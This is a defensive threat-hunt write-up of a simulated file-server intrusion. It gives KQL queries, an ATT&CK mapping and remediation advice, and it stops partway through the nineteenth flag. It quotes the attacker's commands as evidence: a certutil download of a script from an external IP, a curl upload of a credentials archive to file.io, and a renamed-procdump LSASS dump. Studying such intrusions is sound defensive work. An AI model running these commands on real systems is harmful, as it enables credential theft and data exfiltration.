# 🚢 Threat Hunt SAGA#2: Cargo Hold

<img width="740" height="1110" alt="CARGO HOLD" src="https://github.com/user-attachments/assets/ce955900-3d60-46cd-b27c-bb304cacc37d" />

**Sandbox Contributor:** [Cyber Range AZURE LAW by Josh Madakor's team](https://www.skool.com/cyber-community)  
**Hunt Design Master:** Mohammed A  
**Loyal Wingbot:** [MixLocalAgentic_SOC_Analyst](https://github.com/Panbear1983/Multi-Funtion_SOC_Agent_Research/tree/main/openAI_Agentic_SOC_Analyst)

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 📏 Perimeters
Date Completed: ***2026-02-14***    
Simulated Environment: `Cyber Range AZURE LAW`  
Primary Impacted Host: `AZUKI-FileServer01`  
Incident Date Range: ***2025-11-19 to 2026-01-13***  
Hunt Link: [Cyber Range SOC - Cargo Hold](https://docs.google.com/forms/d/e/1FAIpQLSc3bRTzUC8DV2Wvy0cUkaQzCmWKQszo7e5C9Mb-bPPAlHRCSg/viewform)  
Frameworks Applied: ***MITRE ATT&CK***, ***NIST 800-61***

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 📄 Overview

Azuki Import/Export detected a return connection roughly 72 hours after initial access, followed by lateral movement and large data transfers from the file server. Microsoft Defender for Endpoint telemetry shows a compact, deliberate chain: re-entry from a new public IP, RDP pivot to the file server, share reconnaissance, privilege and network discovery, hidden staging, tool transfer, credential harvesting, data staging and compression, cloud exfiltration, persistence via Run keys, and anti-forensic cleanup.

The actor relied heavily on built-in tooling and low-noise tactics, indicating a focus on evasion and operational efficiency rather than malware-heavy tradecraft.

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 💠 Diamond Model Analysis

| Feature | Details |
|---|---|
| **Adversary** | Unattributed. Demonstrates operational discipline, LOLBin usage, and basic OPSEC (tool renaming, hidden staging, history deletion). |
| **Infrastructure** | Re-entry IP `159.26.106.98`. Payload host `78.141.196.6:7331`. Exfil service `file.io`. |
| **Capability** | RDP pivot, share enumeration (`net.exe`), privilege discovery (`whoami /all`), network discovery (`ipconfig /all`), directory hiding (`attrib +h +s`), tool transfer (`certutil`), staging (`xcopy`), archiving (`tar`), LSASS dump (`pd.exe`), persistence (`HKLM\...\Run`), anti-forensics (PowerShell history deletion). |
| **Victim** | Azuki Import/Export Trading Co. File server compromised: `AZUKI-FileServer01`. Compromised account: `fileadmin`. |

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 🥋 MITRE ATT&CK Table

| Stage | Flag | Tactic | Technique ID | Technique |
|---|---|---|---|---|
| Initial Access | 1 | Initial Access | **T1021.001** | Remote Services: Remote Desktop Protocol |
| Lateral Movement | 2 | Lateral Movement | **T1021.001** | Remote Services: Remote Desktop Protocol |
| Lateral Movement | 3 | Lateral Movement | **T1078** | Valid Accounts |
| Discovery | 4 | Discovery | **T1135** | Network Share Discovery |
| Discovery | 5 | Discovery | **T1135** | Network Share Discovery |
| Discovery | 6 | Discovery | **T1033** | System Owner/User Discovery |
| Discovery | 7 | Discovery | **T1016** | System Network Configuration Discovery |
| Defense Evasion | 8 | Defense Evasion | **T1564.001** | Hidden Files and Directories |
| Collection | 9 | Collection | **T1074.001** | Data Staged: Local Data Staging |
| Command & Control | 10 | Command & Control | **T1105** | Ingress Tool Transfer |
| Collection | 11 | Collection | **T1552** | Unsecured Credentials |
| Collection | 12 | Collection | **T1119** | Automated Collection |
| Collection | 13 | Collection | **T1560.001** | Archive Collected Data: Archive via Utility |
| Defense Evasion | 14 | Defense Evasion | **T1036.003** | Masquerading: Rename System Utilities |
| Credential Access | 15 | Credential Access | **T1003.001** | OS Credential Dumping: LSASS Memory |
| Exfiltration | 16 | Exfiltration | **T1567** | Exfiltration Over Web Service |
| Exfiltration | 17 | Exfiltration | **T1567.002** | Exfiltration to Cloud Storage |
| Persistence | 18 | Persistence | **T1547.001** | Boot or Logon Autostart Execution: Registry Run Keys |
| Defense Evasion | 19 | Defense Evasion | **T1036.005** | Masquerading: Match Legitimate Name or Location |
| Defense Evasion | 20 | Defense Evasion | **T1070.003** | Indicator Removal: Clear Command History |

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## ⛨ Remediation Actions

1. **RDP and Account Hardening**
   - Enforce MFA for remote access and restrict RDP to VPN-only networks.
   - Rotate `fileadmin` credentials and audit privileged account usage.

2. **Discovery and Enumeration Detection**
   - Alert on `net.exe` share enumeration and repeated UNC queries.
   - Monitor `whoami /all` and `ipconfig /all` bursts after logon.

3. **LOLBin Abuse Monitoring**
   - Alert on `certutil.exe -urlcache` usage with external URLs.
   - Restrict execution of unsigned tools from system log paths.

4. **Credential Protection**
   - Enable LSASS protection and block Procdump-like tools.
   - Monitor for dump file creation in non-standard locations.

5. **Data Staging and Exfiltration Controls**
   - Alert on `xcopy`/`tar` usage in system log directories.
   - Enforce egress controls and DLP for public file sharing services.

6. **Persistence Monitoring**
   - Audit registry Run keys for suspicious values (e.g., `FileShareSync`).
   - Validate paths referenced by autorun entries.

7. **Forensic Integrity**
   - Enable PowerShell logging and forward logs to a tamper-resistant SIEM.
   - Alert on deletion of PowerShell history files.

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## ✍️ Lessons Learned

- **Dwell-time returns are common:** Re-entry infrastructure often changes to evade IOCs.
- **File servers are prime targets:** Share discovery and staging converge on data-heavy systems.
- **Staging often hides in plain sight:** System log paths are commonly abused for concealment.
- **LOLBin dependency increases stealth:** Certutil, xcopy, and tar blend with admin activity.
- **Persistence is lightweight but effective:** Simple Run keys can survive without loud artifacts.
- **Anti-forensics is late-stage:** History deletion signals a completed operation.

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 🏔️ Conclusion

The Cargo Hold investigation shows a compact but complete intrusion lifecycle: return access via a new public IP → RDP pivot to a file server → discovery and privilege enumeration → hidden staging → payload retrieval via `certutil` → credential file discovery and recursive staging → compression → LSASS memory dumping → cloud exfiltration → persistence via Run key → PowerShell history deletion. The operator avoided custom tooling, relying on trusted system binaries and brief, surgical steps to move from re-entry to data theft.

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">
<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

# 🎯 Capture The Flags

## 🕙 Timeline of Events

| **Timestamp (UTC)**          | **Event**                                   | **Target Device**      | **Details**                              |
|------------------------------|---------------------------------------------|------------------------|-------------------------------------------|
| **2026-01-13 ~**             | Return RDP access detected                  | azuki-sl               | External IP `159.26.106.98` (Flag 1) |
| **2026-01-13 ~**             | Lateral movement to file server             | AZUKI-FileServer01     | RDP pivot to file server (Flag 2) |
| **2026-01-13 ~**             | Compromised account authentication          | AZUKI-FileServer01     | Account `fileadmin` (Flag 3) |
| **2026-01-13 ~**             | Local share enumeration                     | AZUKI-FileServer01     | `net.exe share` command (Flag 4) |
| **2026-01-13 ~**             | Remote share enumeration                    | AZUKI-FileServer01     | `net.exe view \\10.1.0.188` (Flag 5) |
| **2026-01-13 ~**             | Privilege enumeration                       | AZUKI-FileServer01     | `whoami.exe /all` (Flag 6) |
| **2026-01-13 ~**             | Network configuration discovery             | AZUKI-FileServer01     | `ipconfig.exe /all` (Flag 7) |
| **2026-01-13 ~**             | Staging directory hidden                    | AZUKI-FileServer01     | `attrib.exe +h +s` (Flag 8) |
| **2026-01-13 ~**             | Staging directory created                   | AZUKI-FileServer01     | `C:\Windows\Logs\CBS` (Flag 9) |
| **2026-01-13 ~**             | Malicious script download via LOLBin        | AZUKI-FileServer01     | `certutil.exe` abuse (Flag 10) |
| **2026-01-13 ~**             | Credential file discovered                  | AZUKI-FileServer01     | `IT-Admin-Passwords.csv` (Flag 11) |
| **2026-01-13 ~**             | Recursive data staging                      | AZUKI-FileServer01     | `xcopy.exe` command (Flag 12) |
| **2026-01-13 ~**             | Data compression                            | AZUKI-FileServer01     | `tar.exe` archiving (Flag 13) |
| **2026-01-13 ~**             | Renamed credential dumping tool             | AZUKI-FileServer01     | `pd.exe` (Flag 14) |
| **2026-01-13 ~**             | LSASS memory dumped                         | AZUKI-FileServer01     | Procdump execution (Flag 15) |
| **2026-01-13 ~**             | Data exfiltration via cloud service         | AZUKI-FileServer01     | `curl.exe` to file.io (Flag 16) |
| **2026-01-13 ~**             | Exfiltration service identified             | AZUKI-FileServer01     | `file.io` (Flag 17) |
| **2026-01-13 ~**             | Persistence established via Run key         | AZUKI-FileServer01     | Registry value `FileShareSync` (Flag 18) |
| **2026-01-13 ~**             | Persistence beacon configured               | AZUKI-FileServer01     | `svchost.ps1` (Flag 19) |
| **2026-01-13 ~**             | PowerShell history deleted                  | AZUKI-FileServer01     | `ConsoleHost_history.txt` (Flag 20) |

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 🚩 Completed Flag Map

| Flag   | Objective                                   | Value                                           |
|--------|---------------------------------------------|--------------------------------------------------|
| **1**  | Return connection source IP                         | 159.26.106.98                                    |
| **2**  | Compromised file server                         | AZUKI-FileServer01                                          |
| **3**  | Compromised admin account                         | fileadmin                                          |
| **4**  | Local share enumeration command     | "net.exe" share |
| **5**  | Remote share enumeration command  | "net.exe" view \\\\10.1.0.188                                   |
| **6**  | Privilege enumeration command                       | whoami.exe /all                                   |
| **7**  | Network configuration command                        | ipconfig.exe /all                                   |
| **8**  | Directory hiding command                        | attrib.exe +h +s C:\Windows\Logs\CBS                                   |
| **9**  | Staging directory path                        | C:\Windows\Logs\CBS                                   |
| **10** | Script download command                        | certutil.exe -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1                                     |
| **11** | Credential file name                        | IT-Admin-Passwords.csv                                   |
| **12** | Recursive staging copy command                        | xcopy.exe C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y                                   |
| **13** | Compression command                        | tar.exe -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .                                   |
| **14** | Renamed dump tool                        | pd.exe                                   |
| **15** | LSASS dump command                        | pd.exe -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp                                     |
| **16** | Exfiltration command                        | curl.exe -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io                                   |
| **17** | Exfiltration service                        | file.io                                   |
| **18** | Persistence registry value name                        | FileShareSync                                   |
| **19** | Persistence beacon filename                        | svchost.ps1                                   |
| **20** | PowerShell history file deleted                        | ConsoleHost_history.txt                                   |

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

### 🚩 Flag 1: INITIAL ACCESS - Return Connection Source

**Objective:** Identify the source IP address of the return Remote Desktop Protocol connection.

**What to Hunt:** After a dwell period, attackers often return using different infrastructure to evade detection based on initial IOCs. Identifying the return source helps track adversary infrastructure changes.

**Hint 1:** Query logon events for interactive sessions from external sources during the second incident timeframe.

**Hint 2:** Use DeviceLogonEvents table and filter by RemoteIPType containing 'Public' after the initial compromise window.

**Reference:** DeviceLogonEvents

**KQL Query:**

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2026-01-10) .. datetime(2026-01-15))
| where DeviceName contains 'azuki'
| where RemoteIPType contains 'Public'
| project TimeGenerated, DeviceName, AccountDomain, ActionType, AccountName, RemoteIP
| order by TimeGenerated asc
```

**Output:** `159.26.106.98`  
**Finding:** The logs reveal a new external IP address `159.26.106.98` initiating RDP sessions approximately 72 hours after the initial compromise. This change in source IP is consistent with adversary tradecraft to avoid detection based on previously identified IOCs.
<img width="931" height="302" alt=" 11282825 63621626 19" src="https://github.com/user-attachments/assets/dc462a64-197c-4e7b-bb64-b121e4895367" />

---

### 🚩 Flag 2: LATERAL MOVEMENT - Compromised File Server

**Objective:** Identify the file server that was targeted during lateral movement.

**What to Hunt:** After gaining initial access, attackers pivot to high-value targets such as file servers containing sensitive data. Identifying the lateral movement target reveals the attacker's objectives.

**Hint 1:** Search for RDP connections initiated from the initially compromised workstation to internal systems.

**Hint 2:** Look for DeviceLogonEvents with internal IP addresses as destinations from the pivot host.

**Reference:** Remote Services: Remote Desktop Protocol

**KQL Query:**

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2026-01-10) .. datetime(2026-01-15))
| where DeviceName contains 'FileServer'
| where ActionType == 'LogonSuccess'
| project TimeGenerated, DeviceName, AccountName, RemoteIP, LogonType
| order by TimeGenerated asc
```

**Output:** `AZUKI-FileServer01`  
**Finding:** The query results show successful logon events to `AZUKI-FileServer01` following the return access. File servers are prime targets for data theft operations, making this lateral movement consistent with the adversary's collection objectives.
<img width="913" height="271" alt="backup-admin" src="https://github.com/user-attachments/assets/e8e9e29f-1546-497d-b8c3-5526d995c86d" />

---

### 🚩 Flag 3: LATERAL MOVEMENT - Compromised Admin Account

**Objective:** Identify the admin account used for file server access.

**What to Hunt:** Attackers use compromised credentials with elevated privileges to access sensitive systems. Identifying the account reveals the scope of credential compromise.

**Hint 1:** Focus on the account that authenticated to the file server during the lateral movement.

**Hint 2:** Cross-reference the logon event timestamp with the file server access.

**Reference:** Valid Accounts

**KQL Query:**

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2026-01-10) .. datetime(2026-01-15))
| where DeviceName contains 'FileServer01'
| where ActionType == 'LogonSuccess'
| project TimeGenerated, DeviceName, AccountName, RemoteIP
| order by TimeGenerated asc
```

**Output:** `fileadmin`  
**Finding:** The account `fileadmin` was used to authenticate to the file server. This privileged account provides broad access to file shares, enabling the attacker to discover and stage sensitive data for exfiltration.
<img width="1185" height="202" alt="Pasted Graphic 2" src="https://github.com/user-attachments/assets/e51fad53-9933-4dd5-b898-324d9d3ddaa9" />

---

### 🚩 Flag 4: DISCOVERY - Local Share Enumeration

**Objective:** Identify the command used to enumerate local file shares.

**What to Hunt:** Attackers enumerate file shares to identify data repositories for collection. Local share discovery reveals what data is accessible from the compromised system.

**Hint 1:** Search for net.exe commands with share-related parameters executed on the file server.

**Hint 2:** Check DeviceProcessEvents for share enumeration commands after the lateral movement.

**Reference:** Network Share Discovery

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-10) .. datetime(2026-01-15))
| where DeviceName contains 'FileServer01'
| where ProcessCommandLine contains 'net' and ProcessCommandLine contains 'share'
| project TimeGenerated, ProcessCommandLine, AccountName
| order by TimeGenerated asc
```

**Output:** `"net.exe" share`  
**Finding:** The `net.exe share` command enumerates all shared resources on the local system. This discovery step allows the attacker to identify available file shares containing potentially sensitive data for subsequent collection.
<img width="1184" height="214" alt="Pasted Graphic 3" src="https://github.com/user-attachments/assets/1c77edf0-64c8-416e-adca-620c9b719b56" />

---

### 🚩 Flag 5: DISCOVERY - Remote Share Enumeration

**Objective:** Identify the command used to enumerate shares on a remote system.

**What to Hunt:** Beyond local shares, attackers enumerate network shares on other systems to expand their access to data repositories across the environment.

**Hint 1:** Look for net.exe view commands with UNC paths targeting internal IP addresses.

**Hint 2:** Filter DeviceProcessEvents for commands containing backslashes and IP addresses.

**Reference:** Network Share Discovery

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-10) .. datetime(2026-01-15))
| where DeviceName contains 'FileServer01'
| where ProcessCommandLine contains 'net' and ProcessCommandLine contains 'view'
| project TimeGenerated, ProcessCommandLine, AccountName
| order by TimeGenerated asc
```

**Output:** `"net.exe" view \\10.1.0.188`  
**Finding:** The attacker used `net.exe view \\10.1.0.188` to enumerate shares on a remote system. This reconnaissance expands the attacker's understanding of data locations across the network, potentially identifying additional targets.
<img width="886" height="271" alt="11222001, 124033316 AM" src="https://github.com/user-attachments/assets/d7a620b6-8fe2-4978-917c-c2bd741385af" />

---

### 🚩 Flag 6: DISCOVERY - Privilege Enumeration

**Objective:** Identify the command used to enumerate user privileges and group memberships.

**What to Hunt:** Attackers enumerate their current privileges to understand their access level and identify opportunities for privilege escalation or data access.

**Hint 1:** Search for whoami commands with privilege-related switches on the file server.

**Hint 2:** Look for /all, /priv, or /groups parameters in DeviceProcessEvents.

**Reference:** System Owner/User Discovery

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-10) .. datetime(2026-01-15))
| where DeviceName contains 'FileServer01'
| where ProcessCommandLine contains 'whoami'
| project TimeGenerated, ProcessCommandLine, AccountName
| order by TimeGenerated asc
```

**Output:** `whoami.exe /all`  
**Finding:** The `whoami.exe /all` command displays comprehensive information about the current user including username, SID, group memberships, and privileges. This helps the attacker understand their access level on the compromised system.
<img width="878" height="100" alt="weGenerated (UTC)" src="https://github.com/user-attachments/assets/a74a352d-a1e6-4ca1-9f3b-f6f1c3a381e3" />

---

### 🚩 Flag 7: DISCOVERY - Network Configuration

**Objective:** Identify the command used to gather network configuration details.

**What to Hunt:** Network configuration discovery reveals adapter settings, IP addresses, DNS servers, and domain information that aids in understanding the network topology.

**Hint 1:** Search for ipconfig commands with verbose output switches.

**Hint 2:** Filter DeviceProcessEvents for network configuration utilities.

**Reference:** System Network Configuration Discovery

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-10) .. datetime(2026-01-15))
| where DeviceName contains 'FileServer01'
| where ProcessCommandLine contains 'ipconfig'
| project TimeGenerated, ProcessCommandLine, AccountName
| order by TimeGenerated asc
```

**Output:** `ipconfig.exe /all`  
**Finding:** The `ipconfig.exe /all` command provides detailed network adapter configuration including IP addresses, subnet masks, gateways, and DNS servers. This information supports further network reconnaissance and lateral movement planning.
<img width="861" height="74" alt=" 11222025 124244 365 AM" src="https://github.com/user-attachments/assets/3d2bad79-1f2a-4393-b953-126c8654bc75" />

---

### 🚩 Flag 8: DEFENSE EVASION - Directory Hiding

**Objective:** Identify the command used to hide the staging directory.

**What to Hunt:** Attackers hide staging directories to evade casual discovery during incident response or routine administration. The attrib command can set hidden and system attributes.

**Hint 1:** Search for attrib commands with +h or +s flags in DeviceProcessEvents.

**Hint 2:** Look for attribute modifications targeting directories in system paths.

**Reference:** Hidden Files and Directories

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-10) .. datetime(2026-01-15))
| where DeviceName contains 'FileServer01'
| where ProcessCommandLine contains 'attrib'
| project TimeGenerated, ProcessCommandLine, AccountName
| order by TimeGenerated asc
```

**Output:** `attrib.exe +h +s C:\Windows\Logs\CBS`  
**Finding:** The `attrib.exe +h +s` command sets both hidden and system attributes on the staging directory. This makes the folder invisible in standard directory listings and marks it as a protected system directory, reducing the chance of discovery.
<img width="1196" height="175" alt="Pasted Graphic 7" src="https://github.com/user-attachments/assets/a1c9fa5c-0adb-4c5b-b41e-c3e4cf1765d5" />

---

### 🚩 Flag 9: COLLECTION - Staging Directory

**Objective:** Identify the path of the hidden staging directory.

**What to Hunt:** Attackers stage tools and collected data in directories that blend with legitimate system paths. Identifying staging locations helps locate artifacts for forensic analysis.

**Hint 1:** Extract the directory path from the attrib command used for hiding.

**Hint 2:** Look for directories in Windows system paths that were recently created or modified.

**Reference:** Data Staged: Local Data Staging

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-10) .. datetime(2026-01-15))
| where DeviceName contains 'FileServer01'
| where ProcessCommandLine contains 'attrib' or ProcessCommandLine contains 'CBS'
| project TimeGenerated, ProcessCommandLine, FolderPath
| order by TimeGenerated asc
```

**Output:** `C:\Windows\Logs\CBS`  
**Finding:** The staging directory `C:\Windows\Logs\CBS` was chosen because it appears to be a legitimate Windows system path (CBS = Component-Based Servicing). This location helps the attacker's activities blend with normal system operations.
<img width="1100" height="67" alt="Pasted Graphic 8" src="https://github.com/user-attachments/assets/9fe20dae-c372-49fc-b95b-e7bf1521816d" />

---

### 🚩 Flag 10: COMMAND & CONTROL - Script Download

**Objective:** Identify the command used to download malicious scripts via a LOLBin.

**What to Hunt:** Living-off-the-land binaries (LOLBins) like certutil are used to download payloads while evading detection. Identifying the download command reveals the payload source and destination.

**Hint 1:** Search for certutil.exe commands with -urlcache parameter and external URLs.

**Hint 2:** Look for file downloads to the staging directory path identified earlier.

**Reference:** Ingress Tool Transfer

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-10) .. datetime(2026-01-15))
| where DeviceName contains 'FileServer01'
| where ProcessCommandLine contains 'certutil' and ProcessCommandLine contains 'urlcache'
| project TimeGenerated, ProcessCommandLine, AccountName
| order by TimeGenerated asc
```

**Output:** `certutil.exe -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1`  
**Finding:** The attacker used `certutil.exe` with `-urlcache -f` to download a PowerShell script from an external C2 server (`78.141.196.6:7331`). This LOLBin technique bypasses application allowlists that block unknown executables.
<img width="1092" height="131" alt="Pasted Graphic 9" src="https://github.com/user-attachments/assets/43d8b006-7de2-4753-9c2d-2613466784e2" />

---

### 🚩 Flag 11: COLLECTION - Credential File Discovery

**Objective:** Identify the credential file discovered on the file server.

**What to Hunt:** File servers often contain sensitive files including password lists or credential databases. Identifying these files reveals the scope of potential credential compromise.

**Hint 1:** Search for file access events involving password or credential-related filenames.

**Hint 2:** Look for CSV or text files in IT administration shares.

**Reference:** Unsecured Credentials

**KQL Query:**

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-10) .. datetime(2026-01-15))
| where DeviceName contains 'FileServer01'
| where FileName contains 'password' or FileName contains 'credential' or FileName contains 'admin'
| project TimeGenerated, FileName, FolderPath, ActionType
| order by TimeGenerated asc
```

**Output:** `IT-Admin-Passwords.csv`  
**Finding:** The file `IT-Admin-Passwords.csv` was discovered on the file server. This spreadsheet likely contains credentials for IT administrative accounts, representing a significant security exposure and high-value target for the attacker.
<img width="1148" height="130" alt="Pasted Graphic 10" src="https://github.com/user-attachments/assets/c4e7fd08-afeb-4bc7-8f5e-d4363d82786f" />

---

### 🚩 Flag 12: COLLECTION - Recursive Data Staging

**Objective:** Identify the command used to recursively copy data to the staging directory.

**What to Hunt:** Attackers use file copy utilities to stage large amounts of data before compression and exfiltration. Recursive copies capture entire directory trees.

**Hint 1:** Search for xcopy or robocopy commands with recursive flags targeting the staging directory.

**Hint 2:** Look for /E flag indicating recursive copying including empty directories.

**Reference:** Automated Collection

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-10) .. datetime(2026-01-15))
| where DeviceName contains 'FileServer01'
| where ProcessCommandLine contains 'xcopy' or ProcessCommandLine contains 'robocopy'
| project TimeGenerated, ProcessCommandLine, AccountName
| order by TimeGenerated asc
```

**Output:** `xcopy.exe C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`  
**Finding:** The `xcopy.exe` command with `/E /I /H /Y` flags recursively copied the entire IT-Admin share to the staging directory, preserving hidden files and overwriting existing files without prompts. This staged the data for compression and exfiltration.
<img width="1104" height="186" alt="Pasted Graphic 11" src="https://github.com/user-attachments/assets/05228693-b774-4cf0-aacf-0e0777c647b2" />

---

### 🚩 Flag 13: COLLECTION - Data Compression

**Objective:** Identify the command used to compress staged data.

**What to Hunt:** Attackers compress data before exfiltration to reduce transfer size and time. The compression command reveals the archive format and contents.

**Hint 1:** Search for tar, zip, or compression-related commands in DeviceProcessEvents.

**Hint 2:** Look for archive creation commands targeting the staging directory.

**Reference:** Archive Collected Data: Archive via Utility

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-10) .. datetime(2026-01-15))
| where DeviceName contains 'FileServer01'
| where ProcessCommandLine contains 'tar' or ProcessCommandLine contains 'zip' or ProcessCommandLine contains 'compress'
| project TimeGenerated, ProcessCommandLine, AccountName
| order by TimeGenerated asc
```

**Output:** `tar.exe -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`  
**Finding:** The `tar.exe` command with `-czf` flags created a gzip-compressed tar archive of the staged IT-Admin data. The `-C` flag changed to the source directory before archiving, creating a clean archive structure.
<img width="1134" height="246" alt="Pasted Graphic 12" src="https://github.com/user-attachments/assets/366810e7-ca84-445d-b696-081354a94738" />

---

### 🚩 Flag 14: CREDENTIAL ACCESS - Renamed Dump Tool

**Objective:** Identify the renamed credential dumping tool.

**What to Hunt:** Attackers rename tools to evade signature-based detection. Identifying renamed tools helps attribute the technique and locate additional artifacts.

**Hint 1:** Search for executables with Procdump-like command line arguments but non-standard filenames.

**Hint 2:** Look for -accepteula and -ma parameters typically associated with Sysinternals tools.

**Reference:** Masquerading: Rename System Utilities

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-10) .. datetime(2026-01-15))
| where DeviceName contains 'FileServer01'
| where ProcessCommandLine contains 'accepteula' or ProcessCommandLine contains 'lsass'
| project TimeGenerated, ProcessCommandLine, FileName
| order by TimeGenerated asc
```

**Output:** `pd.exe`  
**Finding:** The credential dumping tool was renamed to `pd.exe` to avoid detection based on the original filename (likely procdump.exe). This simple OPSEC technique helps evade file-based signatures while maintaining functionality.
<img width="781" height="125" alt=" 117820 60641330 AM" src="https://github.com/user-attachments/assets/4d672dfc-85ba-45ed-bad4-1213a8631b8a" />

---

### 🚩 Flag 15: CREDENTIAL ACCESS - LSASS Memory Dump

**Objective:** Identify the command used to dump LSASS process memory.

**What to Hunt:** LSASS (Local Security Authority Subsystem Service) stores credentials in memory. Dumping LSASS enables offline credential extraction using tools like Mimikatz.

**Hint 1:** Search for commands targeting the LSASS process ID with memory dump parameters.

**Hint 2:** Look for -ma (dump all) flag and .dmp file creation in the staging directory.

**Reference:** OS Credential Dumping: LSASS Memory

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-10) .. datetime(2026-01-15))
| where DeviceName contains 'FileServer01'
| where ProcessCommandLine contains '.dmp' or ProcessCommandLine contains 'lsass'
| project TimeGenerated, ProcessCommandLine, FileName
| order by TimeGenerated asc
```

**Output:** `pd.exe -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp`  
**Finding:** The renamed Procdump (`pd.exe`) was used with `-accepteula -ma` flags to create a full memory dump of the LSASS process (PID 876). The dump file was written to the staging directory for offline credential extraction.
<img width="787" height="76" alt="Pasted Graphic 14" src="https://github.com/user-attachments/assets/7a8e5e30-79e6-49c4-8eb5-1f924463b1e6" />

---

### 🚩 Flag 16: EXFILTRATION - Exfiltration Command

**Objective:** Identify the command used to exfiltrate the compressed archive.

**What to Hunt:** Attackers use HTTP-based file upload services for data exfiltration. The exfiltration command reveals the method and destination.

**Hint 1:** Search for curl or wget commands with file upload parameters.

**Hint 2:** Look for -F flag indicating form-based file upload.

**Reference:** Exfiltration Over Web Service

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-10) .. datetime(2026-01-15))
| where DeviceName contains 'FileServer01'
| where ProcessCommandLine contains 'curl' and ProcessCommandLine contains 'file'
| project TimeGenerated, ProcessCommandLine, AccountName
| order by TimeGenerated asc
```

**Output:** `curl.exe -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io`  
**Finding:** The `curl.exe` command with `-F file=@` uploads the compressed archive via HTTP POST to file.io. This method uses a legitimate file sharing service to blend exfiltration traffic with normal web activity.
<img width="1170" height="187" alt="Pasted Graphic 15" src="https://github.com/user-attachments/assets/d61ef2a7-a4be-44bc-adac-0dc22b7f6dd6" />

---

### 🚩 Flag 17: EXFILTRATION - Exfiltration Service

**Objective:** Identify the cloud service used for data exfiltration.

**What to Hunt:** Public file sharing services are commonly abused for exfiltration because they appear as legitimate web traffic. Identifying the service enables blocking and potential data recovery.

**Hint 1:** Extract the destination URL from the curl exfiltration command.

**Hint 2:** Look for known file sharing domains in DeviceNetworkEvents.

**Reference:** Exfiltration to Cloud Storage

**KQL Query:**

```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2026-01-10) .. datetime(2026-01-15))
| where DeviceName contains 'FileServer01'
| where InitiatingProcessCommandLine contains 'curl'
| project TimeGenerated, InitiatingProcessCommandLine, RemoteUrl
| order by TimeGenerated asc
```

**Output:** `file.io`  
**Finding:** The exfiltration destination `file.io` is a public file sharing service that provides anonymous, temporary file hosting. This service is commonly abused for data exfiltration because uploads appear as legitimate HTTPS traffic.
<img width="1157" height="152" alt="Pasted Graphic 16" src="https://github.com/user-attachments/assets/055fd6af-91cc-4ae2-9a9b-3cb2d1cd34d1" />

---

### 🚩 Flag 18: PERSISTENCE - Registry Run Key Value

**Objective:** Identify the registry value name used for persistence.

**What to Hunt:** Registry Run keys execute programs at user logon, providing persistence across reboots. The value name often attempts to appear legitimate.

**Hint 1:** Search DeviceRegistryEvents for modifications to Run keys during the incident timeline.

**Hint 2:** Look for new values added to HKLM or HKCU Software\Microsoft\Windows\CurrentVersion\Run.

**Reference:** Boot or Logon Autostart Execution: Registry Run Keys

**KQL Query:**

```kql
DeviceRegistryEvents
| where TimeGenerated between (datetime(2026-01-10) .. datetime(2026-01-15))
| where DeviceName contains 'FileServer01'
| where RegistryKey contains 'Run'
| where ActionType == 'RegistryValueSet'
| project TimeGenerated, RegistryKey, RegistryValueName, RegistryValueData
| order by TimeGenerated asc
```

**Output:** `FileShareSync`  
**Finding:** The registry value `FileShareSync` was added to a Run key for persistence. The name mimics legitimate file synchronization software, reducing suspicion during manual registry inspection.
<img width="713" height="137" alt="11222720051211-29916 AM" src="https://github.com/user-attachments/assets/15b0bcfc-f242-4e74-bc1f-a51e902bb563" />

---

### 🚩 Flag 19: PERSISTENCE - Beacon Filename

**Objective:** Identify the persistence beacon script filename.

**What to Hunt:** The Run key value data contains the path to the persistence payload. Identifying this file enables removal and analysis of the persistence mechanism.

**Hint 1:** Extract the filename from the registry value data in the Run key entry.

**Hint 2:** Look for script files (ps1, bat, vbs) referenced in the registry value.

**Reference:** Masquerading: Match Legitimate Name or Location

**KQL Query:**

```kql
